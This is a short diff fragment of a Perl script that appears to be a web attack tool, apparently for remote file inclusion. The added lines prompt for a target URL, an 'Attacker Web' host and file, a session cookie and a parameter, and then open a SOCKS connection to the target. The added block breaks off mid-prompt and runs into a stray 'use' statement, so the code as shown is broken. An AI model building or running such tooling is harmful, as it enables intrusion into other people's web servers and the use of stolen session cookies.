@@ -2415,6 +2415,18 @@ close($sock);
 
 if ($enter =~2) {
 
+	print item(),"Enter URL: ";
+	chomp($url=<STDIN>);
+	print item(),"Enter File Name: ";
+	chomp($filename=<STDIN>);	   
+	print item(),"Enter Attacker Web: ";
+	chomp($attacker=<STDIN>);	   
+	print item(),"Enter Attacker Web File Name: ";
+	chomp($attackerfile=<STDIN>);	   
+	print item(),"Enter Cookie or leave blank: ";
+	chomp($cookie=<STDIN>);	   
+	print item(),"Enter Parameter1: ";
+	
 use IO::Socket::SecureSocks;
 my $socket = IO::Socket::SecureSocks->new(
                                 ConnectAddr => $url,
